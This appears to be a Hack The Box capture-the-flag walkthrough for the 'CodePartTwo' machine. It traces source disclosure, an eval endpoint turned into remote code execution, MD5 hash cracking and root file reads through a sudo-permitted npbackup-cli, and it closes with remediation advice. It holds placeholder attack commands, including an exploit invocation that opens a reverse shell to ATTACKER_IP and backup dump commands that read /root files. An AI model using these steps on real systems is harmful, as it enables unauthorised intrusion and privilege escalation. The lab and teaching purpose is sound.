CodePartTwo

HTB Linux Medium Web → RCE → Creds → PrivEsc

This walkthrough documents a compromise path driven by insecure application exposure: unauthenticated source code disclosure revealed a server-side code execution primitive, which enabled initial foothold. Post-exploitation recovered weakly protected credentials, and the final escalation abused a misconfigured privileged backup utility.

Overview

high-level chain, kept reproducible

Entry point

Unauthenticated source download exposed backend routes and execution logic.

Escalation

Privileged backup tooling permitted root-level file access via snapshot extraction.

Note: This public version omits sensitive artifacts (flags, passwords, unique identifiers). Commands use placeholders.

Reconnaissance

service discovery → attack surface selection

Standard TCP enumeration identified SSH and an HTTP application served by a Python stack (Gunicorn). The web service became the primary target due to a larger attack surface and potential logic flaws.

nmap -sC -sV TARGET_IP

Web enumeration

misconfiguration: source exposure

The application allowed downloading a project archive without authentication, exposing internal routes, dependencies, and dangerous functionality. This is a common “accidental dev artifact” class issue that collapses security-by-obscurity immediately.

wget http://TARGET_IP:PORT/download unzip download
Impact: Full backend visibility → faster exploit development and higher confidence in exploitability.

Initial access

unsafe evaluation on the server

Source review revealed an endpoint that evaluated user-controlled code. Any server-side “eval” primitive effectively becomes remote code execution unless strongly sandboxed and constrained.

POST /run_code {"code":"...user controlled..."}

The exploitation goal was to convert the evaluation primitive into a stable shell. In a lab environment this typically means establishing an outbound connection to the attacker host.

python3 exploit.py --target http://TARGET_IP:PORT/run_code --lhost ATTACKER_IP
Result: Foothold achieved (non-privileged context), enabling local enumeration and credential discovery.

Post-exploitation

local artifacts → credential material

Application directories contained a local database. Password material was stored using weak hashing (unsalted MD5), making offline recovery feasible with commodity wordlists. This reduced the time-to-SSH significantly.

cd /home/app/app/instance/ # inspect local DB and credential material ls -la
Risk: Weak hashing enables fast offline cracking; compromise of one service becomes lateral movement.

Privilege escalation

sudo policy review → dangerous root-capable tooling

Sudo rules permitted executing a backup utility as root without a password. Backup/restore tools are frequent escalation vectors: if they can read arbitrary paths or restore to arbitrary locations, they become a root file read/write primitive.

sudo -l

Snapshot enumeration and extraction features were used to access privileged files. The important detail is not the target file itself, but that the tool provided root-level filesystem access through a trusted workflow.

sudo npbackup-cli -c npbackup.conf --snapshots sudo npbackup-cli -c npbackup.conf -f --dump /root/FILE --snapshot-id SNAPSHOT_ID
Impact: Root-level file access → full compromise. If write primitives exist, persistence is trivial.

Attack chain summary

  • Unauthenticated source code disclosure enabled precise exploit development.
  • Unsafe server-side evaluation exposed a direct path to code execution.
  • Weak credential storage supported offline recovery and SSH access.
  • Sudo misconfiguration granted root-capable backup tooling access.

Security recommendations

fixes mapped to each stage
  • Remove source exposure: eliminate debug/download routes; require auth and audit static file handlers.
  • Eliminate eval primitives: never evaluate user input. If “code running” is required, use strict sandboxing and allowlists.
  • Upgrade credential storage: Argon2id/bcrypt with per-user salts; enforce rotation after incidents.
  • Harden sudo: least privilege; avoid root execution of tools that can read/write arbitrary files.
  • Operational controls: logging + alerting for admin actions; periodic reviews of privileged utilities.

Tools
